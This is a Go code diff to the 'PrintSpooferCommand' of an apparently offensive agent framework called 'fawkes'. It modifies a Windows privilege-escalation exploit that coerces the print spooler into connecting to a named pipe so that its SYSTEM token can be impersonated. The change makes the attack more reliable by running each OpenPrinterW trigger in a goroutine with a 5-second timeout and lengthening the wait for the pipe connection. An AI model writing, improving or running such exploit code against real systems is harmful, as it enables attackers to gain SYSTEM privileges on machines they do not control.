@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"strings"
+	"time"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -161,16 +162,33 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		//
 		// Try multiple hostname formats since some Windows builds reject certain names.
 		// OpenPrinterW errors are non-fatal — the pipe connection is what matters.
+		//
+		// IMPORTANT: OpenPrinterW uses SyscallN which blocks the OS thread.
+		// On domain-joined systems, it can block indefinitely during path resolution.
+		// Each trigger runs in a separate goroutine with a 5-second timeout.
 		var triggerWarnings []string
 		hostnames := []string{computerName, "localhost"}
 		for _, host := range hostnames {
 			printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
-			triggerErr := triggerSpooler(printerName)
-			if triggerErr != nil {
-				triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: %v", host, triggerErr))
+
+			// Run trigger in goroutine — OpenPrinterW can block the OS thread
+			triggerDone := make(chan error, 1)
+			go func(name string) {
+				triggerDone <- triggerSpooler(name)
+			}(printerName)
+
+			// Wait for trigger to complete or timeout (5s per attempt)
+			select {
+			case triggerErr := <-triggerDone:
+				if triggerErr != nil {
+					triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: %v", host, triggerErr))
+				}
+			case <-time.After(5 * time.Second):
+				triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: OpenPrinterW timed out (5s)", host))
 			}
+
 			// Check if spooler already connected after this trigger
-			checkResult, _ := windows.WaitForSingleObject(event, 500)
+			checkResult, _ := windows.WaitForSingleObject(event, 1000)
 			if checkResult == windows.WAIT_OBJECT_0 {
 				break // Connected!
 			}
